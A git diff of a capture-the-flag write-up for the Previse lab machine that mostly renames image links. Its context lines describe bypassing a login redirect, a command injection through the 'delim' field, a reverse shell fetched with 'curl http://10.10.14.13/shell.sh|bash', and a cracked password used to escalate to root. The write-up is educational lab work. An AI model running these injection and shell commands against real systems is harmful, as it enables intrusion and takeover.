@@ -19,23 +19,23 @@ PORT   STATE SERVICE
 
 Port 80 had a login page to some kind of file manager:
 
-![](<../../../.gitbook/assets/image%20(2627).png>)
+![](../../../.gitbook/assets/previse-6.png)
 
 This wasn't vulnerable to SQL Injection or anything. I tried visiting `index.php`, but was redirected back to the `login.php`. When the traffic is inspectedi nBurp, I noticed that `index.php` was still loaded.
 
-![](<../../../.gitbook/assets/image%20(1087).png>)
+![](../../../.gitbook/assets/previse-2.png)
 
 This means that we can view the pages without logging in since they are loaded before we are redirected. When I used Burp's Match and Replace function to change the 302 Found to 200 OK, I could load the page normally:
 
-![](<../../../.gitbook/assets/image%20(2176).png>)
+![](../../../.gitbook/assets/previse-4.png)
 
 Within the Accounts tab, we can add a user.
 
-![](<../../../.gitbook/assets/image%20(2714).png>)
+![](../../../.gitbook/assets/previse-7.png)
 
 So I created one and we can remove the Burpsuite filtering. Within the Files tab, there's a backup of the entire site uploaded.
 
-![](<../../../.gitbook/assets/image%20(4042).png>)
+![](../../../.gitbook/assets/previse-9.png)
 
 We can download this file and analyse the source code back on my machine. Here's the `logs.php`.
 
@@ -104,11 +104,11 @@ Upgrade-Insecure-Requests: 1
 delim=comma; ping -c 1 10.10.14.13 
 ```
 
-![](<../../../.gitbook/assets/image%20(2586).png>)
+![](../../../.gitbook/assets/previse-5.png)
 
 Now, we can get a reverse shell by using `curl http://10.10.14.13/shell.sh|bash`.
 
-![](<../../../.gitbook/assets/image%20(394).png>)
+![](../../../.gitbook/assets/previse-8.png)
 
 ## Privilege Escalation
 
@@ -157,7 +157,7 @@ $1$🧂llol$DQpmdvnb7EeuO6UaqRItf.:ilovecody112235!
 
 We can then `su` to `m4lwhere`.
 
-![](<../../../.gitbook/assets/image%20(1885).png>)
+![](../../../.gitbook/assets/previse-3.png)
 
 ### Sudo Privileges
 
@@ -195,4 +195,4 @@ m4lwhere@previse:/tmp$ sudo /opt/scripts/access_backup.sh
 
 It's easy to get a `root` shell afterwards.
 
-![](<../../../.gitbook/assets/image%20(1086).png>)
+![](../../../.gitbook/assets/previse-1.png)
